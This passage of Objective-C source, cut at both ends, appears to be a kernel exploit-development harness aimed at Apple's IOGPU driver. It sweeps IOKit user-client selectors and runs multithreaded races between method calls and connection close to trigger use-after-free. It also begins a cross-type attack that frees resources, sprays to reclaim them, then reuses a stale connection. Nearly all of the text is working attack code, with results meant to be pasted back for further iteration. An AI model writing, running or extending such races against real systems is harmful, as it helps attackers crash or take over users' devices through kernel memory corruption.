    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pGetConn(dev);
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    uint32_t qid = pGetID ? pGetID(queue) : 1;
    [out appendFormat:@"conn=%u qid=%u\n", conn, qid];

    // Setup: call sel=8 and sel=16 multiple times
    [out appendString:@"\n--- setup: sel=8/16 x5 ---\n"];
    for (int i = 0; i < 5; i++) {
        uint64_t sc[1] = {qid};
        pCall(conn, 8, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
        pCall(conn, 16, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
    }
    [out appendString:@"setup done\n"];

    // Sweep sel=33 and sel=34
    [out appendString:@"\n--- sel=33 sweep ---\n"];
    for (uint32_t sc = 0; sc <= 4; sc++) {
        for (uint32_t val = 0; val <= 2; val++) {
            uint64_t sbuf[4] = {val, 0, qid, 0x40};
            uint32_t osc = 0; size_t oss = 0;
            kern_return_t r = pCall(conn, 33, sbuf, sc, NULL, 0, NULL, &osc, NULL, &oss);
            if (r != 0xe00002c2) {
                [out appendFormat:@"sel=33 sc=%u val=%u: rc=0x%08x\n", sc, val, (unsigned)r];
                if (r == 0) [out appendString:@" *** SUCCESS ***\n"];
            }
        }
    }
    [out appendString:@"\n--- sel=34 sweep ---\n"];
    for (uint32_t sc = 0; sc <= 4; sc++) {
        for (uint32_t val = 0; val <= 2; val++) {
            uint64_t sbuf[4] = {val, 0, qid, 0x40};
            uint32_t osc = 0; size_t oss = 0;
            kern_return_t r = pCall(conn, 34, sbuf, sc, NULL, 0, NULL, &osc, NULL, &oss);
            if (r != 0xe00002c2) {
                [out appendFormat:@"sel=34 sc=%u val=%u: rc=0x%08x\n", sc, val, (unsigned)r];
                if (r == 0) [out appendString:@" *** SUCCESS ***\n"];
            }
        }
    }

    // If sel=33/34 succeed, race them vs close
    [out appendString:@"\n--- sel=33 race ---\n"];
    {
        void *dev2 = pDevCreate(svc);
        io_connect_t conn2 = dev2 ? pGetConn(dev2) : 0;
        void *a2 = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)a2 + 0x400) = *(uint32_t *)((uint8_t *)dev2 + 0x08);
        *(uint8_t *)((uint8_t *)a2 + 0x404) = *(uint8_t *)((uint8_t *)dev2 + 0x08);
        void *q2 = pQueueCreate(dev2, a2, 0x410);
        free(a2);
        uint32_t qid2 = pGetID ? pGetID(q2) : 1;
        if (conn2 && q2) {
            // Setup
            uint64_t sc[1] = {qid2};
            for (int i = 0; i < 5; i++) {
                pCall(conn2, 8, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
                pCall(conn2, 16, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
            }
            __block volatile int go = 0;
            __block volatile int hits = 0;
            __block volatile int dead = 0;
            __block kern_return_t closeRc = -1;
            dispatch_group_t grp = dispatch_group_create();
            for (int t = 0; t < 4; t++) {
                dispatch_queue_t tq = dispatch_queue_create("p010.s33", NULL);
                dispatch_group_async(grp, tq, ^{
                    while (!go) {}
                    uint64_t s[2] = {0, qid2};
                    for (int i = 0; i < 25000; i++) {
                        kern_return_t r = pCall(conn2, 33, s, 2, NULL, 0, NULL, NULL, NULL, NULL);
                        if (r == 0) hits++;
                        else if (r == 0x10000003) dead++;
                    }
                });
            }
            dispatch_queue_t cq = dispatch_queue_create("p010.s33close", NULL);
            dispatch_group_async(grp, cq, ^{
                while (!go) {}
                closeRc = pClose(conn2);
            });
            go = 1;
            dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
            [out appendFormat:@"sel=33 race: hits=%d dead=%d close=0x%08x\n",
                hits, dead, (unsigned)closeRc];
            if (dev2 && pDevRelease) pDevRelease(dev2);
        }
    }

    pClose(conn);
    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// Type=1 full selector sweep — type=1 opened a DIFFERENT user client!
// Sweep ALL selectors 0-60 with sc=0 and sc=1 to find the submit method.
+ (NSString *)runP010Type1Sweep {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Type=1 Full Selector Sweep ===\n\n"];
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }

    io_connect_t conn = 0;
    kern_return_t kr = pOpen(svc, mach_task_self(), 1, &conn);
    pRelease(svc);
    if (kr != 0 || !conn) { [out appendFormat:@"type=1 open FAILED: 0x%08x\n", (unsigned)kr]; return out; }
    [out appendFormat:@"type=1 conn=%u\n\n", conn];

    // Full sweep: sel 0-60, sc 0-4, also try with struct 0x40 and 0x1000
    [out appendString:@"--- selector sweep (sc=0..4) ---\n"];
    for (uint32_t sel = 0; sel <= 60; sel++) {
        int found = 0;
        for (uint32_t sc = 0; sc <= 4 && !found; sc++) {
            uint64_t sbuf[4] = {1, 0, 0, 0};
            uint32_t osc = 0; size_t oss = 0;
            kern_return_t r = pCall(conn, sel, sbuf, sc, NULL, 0, NULL, &osc, NULL, &oss);
            if (r != 0xe00002c2 && r != 0x10000003) {
                [out appendFormat:@"sel=%u sc=%u: rc=0x%08x", sel, sc, (unsigned)r];
                if (r == 0) [out appendString:@" SUCCESS"];
                [out appendString:@"\n"];
                found = 1;
            }
        }
    }

    // Also try with struct input (some methods need struct, not scalars)
    [out appendString:@"\n--- struct sweep (ss=0x40, 0x1000) ---\n"];
    for (uint32_t sel = 0; sel <= 60; sel++) {
        for (uint32_t ss = 0x40; ss <= 0x1000; ss = (ss == 0x40) ? 0x1000 : ss + 0x1000) {
            void *dbuf = calloc(1, ss);
            uint32_t osc = 0; size_t oss = 0;
            kern_return_t r = pCall(conn, sel, NULL, 0, dbuf, ss, NULL, &osc, NULL, &oss);
            if (r != 0xe00002c2 && r != 0x10000003) {
                [out appendFormat:@"sel=%u ss=0x%x: rc=0x%08x", sel, ss, (unsigned)r];
                if (r == 0) [out appendString:@" SUCCESS"];
                [out appendString:@"\n"];
            }
            free(dbuf);
        }
    }

    pClose(conn);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// sel=42 race on type=1 user client + sel=56-60 after sel=42 setup
+ (NSString *)runP010Type1Race {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Type=1 sel=42 Race ===\n\n"];
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }

    // Open type=1
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(svc, mach_task_self(), 1, &conn);
    if (kr != 0 || !conn) { [out appendFormat:@"open FAILED 0x%08x\n", (unsigned)kr]; pRelease(svc); return out; }
    [out appendFormat:@"type=1 conn=%u\n", conn];

    // Call sel=42 to set up state
    uint64_t sc42[1] = {1};
    kern_return_t r42 = pCall(conn, 42, sc42, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [out appendFormat:@"sel=42 setup: rc=0x%08x\n", (unsigned)r42];

    // Try sel=42 with different scalar values
    [out appendString:@"\n--- sel=42 scalar sweep ---\n"];
    for (uint32_t val = 0; val <= 5; val++) {
        uint64_t sc[1] = {val};
        kern_return_t r = pCall(conn, 42, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);
        [out appendFormat:@"sel=42 val=%u: rc=0x%08x\n", val, (unsigned)r];
    }

    // Try sel=56-60 after sel=42 setup
    [out appendString:@"\n--- sel=56-60 after sel=42 ---\n"];
    for (uint32_t sel = 56; sel <= 60; sel++) {
        for (uint32_t sc = 0; sc <= 2; sc++) {
            uint64_t sbuf[2] = {1, 0};
            kern_return_t r = pCall(conn, sel, sbuf, sc, NULL, 0, NULL, NULL, NULL, NULL);
            if (r != 0xe00002c2) {
                [out appendFormat:@"sel=%u sc=%u: rc=0x%08x", sel, sc, (unsigned)r];
                if (r == 0) [out appendString:@" SUCCESS"];
                [out appendString:@"\n"];
            }
        }
    }

    // Race sel=42 vs close (4 threads)
    [out appendString:@"\n=== sel=42 race vs close ===\n"];
    {
        // Fresh type=1 conn for race
        io_connect_t conn2 = 0;
        kr = pOpen(svc, mach_task_self(), 1, &conn2);
        if (kr != 0 || !conn2) { [out appendFormat:@"race open FAILED\n"]; goto cleanup; }
        [out appendFormat:@"race conn=%u\n", conn2];

        // Setup sel=42 on race conn
        uint64_t sc[1] = {1};
        pCall(conn2, 42, sc, 1, NULL, 0, NULL, NULL, NULL, NULL);

        __block volatile int go = 0;
        __block volatile int hits = 0;
        __block volatile int dead = 0;
        __block kern_return_t closeRc = -1;

        dispatch_group_t grp = dispatch_group_create();
        for (int t = 0; t < 4; t++) {
            dispatch_queue_t tq = dispatch_queue_create("p010.t1", NULL);
            dispatch_group_async(grp, tq, ^{
                while (!go) {}
                uint64_t s[1] = {1};
                for (int i = 0; i < 25000; i++) {
                    kern_return_t r = pCall(conn2, 42, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (r == 0) hits++;
                    else if (r == 0x10000003) dead++;
                }
            });
        }
        dispatch_queue_t cq = dispatch_queue_create("p010.t1close", NULL);
        dispatch_group_async(grp, cq, ^{
            while (!go) {}
            closeRc = pClose(conn2);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
        [out appendFormat:@"sel=42 race: hits=%d dead=%d close=0x%08x\n",
            hits, dead, (unsigned)closeRc];
        [out appendString:@"panic = UAF on type=1 sel=42!\n"];
    }

cleanup:
    pClose(conn);
    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// Combine type=0 and type=1: open BOTH, race methods on one vs close on other.
// If they share GPU hardware state, closing one might corrupt the other's methods.
+ (NSString *)runP010DualTypeRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Dual-Type Race (type=0 + type=1) ===\n\n"];
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP dlopen\n"]; return out; }
    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }

    // Open type=0 (via IOGPUDeviceCreate) and type=1 (via IOServiceOpen)
    void *dev0 = pDevCreate(svc);
    io_connect_t conn0 = dev0 ? pGetConn(dev0) : 0;
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev0 + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev0 + 0x08);
    void *queue0 = pQueueCreate(dev0, args, 0x410);
    free(args);
    uint32_t qid0 = pGetID ? pGetID(queue0) : 1;

    io_connect_t conn1 = 0;
    kern_return_t kr = pOpen(svc, mach_task_self(), 1, &conn1);

    [out appendFormat:@"type=0 conn=%u qid=%u | type=1 conn=%u rc=0x%08x\n",
        conn0, qid0, conn1, (unsigned)kr];

    if (!conn0 || !conn1) { [out appendString:@"STOP no conns\n"]; goto done3; }

    // Setup: call sel=8/16 on type=0, sel=42 on type=1
    uint64_t sc0[1] = {qid0};
    pCall(conn0, 8, sc0, 1, NULL, 0, NULL, NULL, NULL, NULL);
    pCall(conn0, 16, sc0, 1, NULL, 0, NULL, NULL, NULL, NULL);
    uint64_t sc1[1] = {1};
    pCall(conn1, 42, sc1, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [out appendString:@"setup done\n"];

    // Race A: sel=8 on type=0 vs close type=1
    [out appendString:@"\n--- Race A: type=0 sel=8 vs close type=1 ---\n"];
    {
        __block volatile int go = 0;
        __block volatile int hits = 0;
        __block volatile int dead = 0;
        __block volatile int errs = 0;
        __block volatile unsigned lastErr = 0;
        __block kern_return_t closeRc = -1;
        dispatch_group_t grp = dispatch_group_create();
        for (int t = 0; t < 4; t++) {
            dispatch_queue_t tq = dispatch_queue_create("dual.a", NULL);
            dispatch_group_async(grp, tq, ^{
                while (!go) {}
                uint64_t s[1] = {qid0};
                for (int i = 0; i < 25000; i++) {
                    kern_return_t r = pCall(conn0, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                    if (r == 0) hits++;
                    else if (r == 0x10000003) dead++;
                    else { errs++; lastErr = (unsigned)r; }
                }
            });
        }
        dispatch_queue_t cq = dispatch_queue_create("dual.aclose", NULL);
        dispatch_group_async(grp, cq, ^{
            while (!go) {}
            closeRc = pClose(conn1);
        });
        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
        [out appendFormat:@"A: hits=%d dead=%d errs=%d lastErr=0x%08x close1=0x%08x\n",
            hits, dead, errs, lastErr, (unsigned)closeRc];
        // Post-close check: is conn0 still usable?
        {
            uint64_t s[1] = {qid0};
            kern_return_t r1 = pCall(conn0, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
            [out appendFormat:@"A-post: sel=8 rc=0x%08x\n", (unsigned)r1];
        }
    }

    // Race B: sel=42 on type=1 vs close type=0
    [out appendString:@"\n--- Race B: type=1 sel=42 vs close type=0 ---\n"];
    {
        // Fresh conns
        void *dev0b = pDevCreate(svc);
        io_connect_t conn0b = dev0b ? pGetConn(dev0b) : 0;
        void *a = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)a + 0x400) = *(uint32_t *)((uint8_t *)dev0b + 0x08);
        *(uint8_t *)((uint8_t *)a + 0x404) = *(uint8_t *)((uint8_t *)dev0b + 0x08);
        void *q0b = pQueueCreate(dev0b, a, 0x410);
        free(a);
        uint32_t qid0b = pGetID ? pGetID(q0b) : 1;
        io_connect_t conn1b = 0;
        pOpen(svc, mach_task_self(), 1, &conn1b);
        if (conn0b && conn1b) {
            uint64_t s[1] = {qid0b};
            pCall(conn0b, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
            uint64_t s1[1] = {1};
            pCall(conn1b, 42, s1, 1, NULL, 0, NULL, NULL, NULL, NULL);

            __block volatile int go = 0;
            __block volatile int hits = 0;
            __block volatile int dead = 0;
            __block volatile int errs = 0;
            __block volatile unsigned lastErr = 0;
            __block kern_return_t closeRc = -1;
            dispatch_group_t grp = dispatch_group_create();
            for (int t = 0; t < 4; t++) {
                dispatch_queue_t tq = dispatch_queue_create("dual.b", NULL);
                dispatch_group_async(grp, tq, ^{
                    while (!go) {}
                    uint64_t s[1] = {1};
                    for (int i = 0; i < 25000; i++) {
                        kern_return_t r = pCall(conn1b, 42, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                        if (r == 0) hits++;
                        else if (r == 0x10000003) dead++;
                        else { errs++; lastErr = (unsigned)r; }
                    }
                });
            }
            dispatch_queue_t cq = dispatch_queue_create("dual.bclose", NULL);
            dispatch_group_async(grp, cq, ^{
                while (!go) {}
                closeRc = pClose(conn0b);
            });
            go = 1;
            dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
            [out appendFormat:@"B: hits=%d dead=%d errs=%d lastErr=0x%08x close0=0x%08x\n",
                hits, dead, errs, lastErr, (unsigned)closeRc];
            if (dev0b && pDevRelease) pDevRelease(dev0b);
        }
    }

    // Race C: sel=42 on type=1 vs close type=1 (same type, different conn)
    [out appendString:@"\n--- Race C: type=1 sel=42 vs close type=1 (diff conn) ---\n"];
    {
        io_connect_t conn1c = 0, conn1d = 0;
        pOpen(svc, mach_task_self(), 1, &conn1c);
        pOpen(svc, mach_task_self(), 1, &conn1d);
        if (conn1c && conn1d) {
            pCall(conn1c, 42, (uint64_t[]){1}, 1, NULL, 0, NULL, NULL, NULL, NULL);
            pCall(conn1d, 42, (uint64_t[]){1}, 1, NULL, 0, NULL, NULL, NULL, NULL);

            __block volatile int go = 0;
            __block volatile int hits = 0;
            __block volatile int dead = 0;
            __block volatile int errs = 0;
            __block volatile unsigned lastErr = 0;
            __block kern_return_t closeRc = -1;
            dispatch_group_t grp = dispatch_group_create();
            for (int t = 0; t < 4; t++) {
                dispatch_queue_t tq = dispatch_queue_create("dual.c", NULL);
                dispatch_group_async(grp, tq, ^{
                    while (!go) {}
                    uint64_t s[1] = {1};
                    for (int i = 0; i < 25000; i++) {
                        kern_return_t r = pCall(conn1c, 42, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                        if (r == 0) hits++;
                        else if (r == 0x10000003) dead++;
                        else { errs++; lastErr = (unsigned)r; }
                    }
                });
            }
            dispatch_queue_t cq = dispatch_queue_create("dual.cclose", NULL);
            dispatch_group_async(grp, cq, ^{
                while (!go) {}
                closeRc = pClose(conn1d);
            });
            go = 1;
            dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
            [out appendFormat:@"C: hits=%d dead=%d errs=%d lastErr=0x%08x close1d=0x%08x\n",
                hits, dead, errs, lastErr, (unsigned)closeRc];
        }
    }

done3:
    if (conn0) pClose(conn0);
    if (dev0 && pDevRelease) pDevRelease(dev0);
    pRelease(svc);
    [out appendString:@"\npanic = shared GPU state UAF! survived = no sharing.\n"];
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// Fire-and-forget race: send method calls via raw mach_msg WITHOUT waiting for reply.
// This floods the port queue. Meanwhile another thread closes the connection.
// If the kernel processes queued messages AFTER close frees resources → UAF.
+ (NSString *)runP010FireAndForget {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Fire-and-Forget Race ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef kern_return_t (*IOConnectSetNotificationPort_t)(io_connect_t, uint32_t, mach_port_t, uintptr_t);
    IOConnectSetNotificationPort_t pSetNote = dlsym(iokit, "IOConnectSetNotificationPort");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP no svc\n"]; return out; }

    void *dev0 = pDevCreate(svc);
    io_connect_t conn0 = dev0 ? pGetConn(dev0) : 0;
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev0 + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev0 + 0x08);
    void *queue0 = pQueueCreate(dev0, args, 0x410);
    free(args);
    uint32_t qid0 = pGetID ? pGetID(queue0) : 0;

    [out appendFormat:@"conn0=%u qid0=%u\n", conn0, qid0];
    if (!conn0) { [out appendString:@"STOP no conn0\n"]; pRelease(svc); return out; }

    // Phase 1: Flood sel=8 calls while closing after 100us delay
    [out appendString:@"\n--- Phase 1: flood sel=8 vs delayed close ---\n"];
    {
        __block volatile int go = 0;
        __block volatile int sent = 0;
        __block volatile int sendErrs = 0;
        __block volatile unsigned lastSendErr = 0;
        __block kern_return_t closeRc = -1;

        dispatch_group_t grp = dispatch_group_create();

        // Thread A: fire-and-forget flood
        dispatch_queue_t fq = dispatch_queue_create("faf.flood", NULL);
        dispatch_group_async(grp, fq, ^{
            while (!go) {}
            uint64_t s[1] = {qid0};
            for (int i = 0; i < 50000; i++) {
                kern_return_t r = pCall(conn0, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                sent++;
                if (r != 0 && r != 0x10000003) {
                    sendErrs++;
                    lastSendErr = (unsigned)r;
                }
            }
        });

        // Thread B: close after a short delay
        dispatch_queue_t cq = dispatch_queue_create("faf.close", NULL);
        dispatch_group_async(grp, cq, ^{
            while (!go) {}
            // Small delay to let some calls queue up
            usleep(100); // 100us
            closeRc = pClose(conn0);
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
        [out appendFormat:@"sent=%d sendErrs=%d lastErr=0x%08x close=0x%08x\n",
            sent, sendErrs, lastSendErr, (unsigned)closeRc];
        [out appendString:sent > 40000 ? @"FLOOD: calls continued after close!\n" : @"FLOOD: close blocked calls\n"];
    }

    // Phase 2: Fresh conn + notification port + race
    [out appendString:@"\n--- Phase 2: notification port + sel=8 race vs close ---\n"];
    {
        io_connect_t conn1 = 0;
        kern_return_t kr = pOpen(svc, mach_task_self(), 0, &conn1);
        if (kr != 0 || !conn1) {
            [out appendFormat:@"no conn1 (rc=0x%08x)\n", (unsigned)kr];
        } else {
            void *dev1 = pDevCreate(svc);
            io_connect_t conn1b = dev1 ? pGetConn(dev1) : conn1;
            uint32_t qid1 = 0;
            if (dev1 && pQueueCreate && pGetID) {
                void *a = calloc(1, 0x410);
                *(uint32_t *)((uint8_t *)a + 0x400) = *(uint32_t *)((uint8_t *)dev1 + 0x08);
                *(uint8_t *)((uint8_t *)a + 0x404) = *(uint8_t *)((uint8_t *)dev1 + 0x08);
                void *q1 = pQueueCreate(dev1, a, 0x410);
                free(a);
                qid1 = pGetID(q1);
            }
            [out appendFormat:@"conn1=%u qid1=%u\n", conn1b, qid1];

            // Register notification port
            mach_port_t notePort = MACH_PORT_NULL;
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notePort);
            if (pSetNote && notePort != MACH_PORT_NULL) {
                kern_return_t nr = pSetNote(conn1b, 0, notePort, qid1);
                [out appendFormat:@"setNotificationPort rc=0x%08x\n", (unsigned)nr];
            } else {
                [out appendString:@"setNotificationPort: no symbol or no port\n"];
            }

            // Now race: send method calls vs close
            __block volatile int go = 0;
            __block volatile int hits = 0;
            __block volatile int dead = 0;
            __block volatile int errs = 0;
            __block volatile unsigned lastErr = 0;
            __block kern_return_t closeRc = -1;

            dispatch_group_t grp = dispatch_group_create();
            for (int t = 0; t < 4; t++) {
                dispatch_queue_t tq = dispatch_queue_create("faf2.t", NULL);
                dispatch_group_async(grp, tq, ^{
                    while (!go) {}
                    uint64_t s[1] = {qid1};
                    for (int i = 0; i < 25000; i++) {
                        kern_return_t r = pCall(conn1b, 8, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                        if (r == 0) hits++;
                        else if (r == 0x10000003) dead++;
                        else { errs++; lastErr = (unsigned)r; }
                    }
                });
            }
            dispatch_queue_t cq = dispatch_queue_create("faf2.close", NULL);
            dispatch_group_async(grp, cq, ^{
                while (!go) {}
                usleep(50);
                closeRc = pClose(conn1b);
            });
            go = 1;
            dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);
            [out appendFormat:@"hits=%d dead=%d errs=%d lastErr=0x%08x close=0x%08x\n",
                hits, dead, errs, lastErr, (unsigned)closeRc];

            // Check if notification port received anything
            if (notePort != MACH_PORT_NULL) {
                mach_msg_header_t msg;
                kern_return_t rr = mach_msg(&msg, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                    0, sizeof(msg), notePort, 10, MACH_PORT_NULL);
                [out appendFormat:@"notePort recv rc=0x%08x\n", (unsigned)rr];
                mach_port_deallocate(mach_task_self(), notePort);
            }
            if (dev1 && pDevRelease) pDevRelease(dev1);
        }
    }

    pRelease(svc);
    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}

// Cross-type UAF: close type=1 frees shared resources, spray to reclaim, then
// call sel=8 on type=0. If the kernel reads our controlled data → UAF confirmed.
+ (NSString *)runP010CrossTypeUAF {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 Cross-Type UAF (close type=1 → spray → use type=0) ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
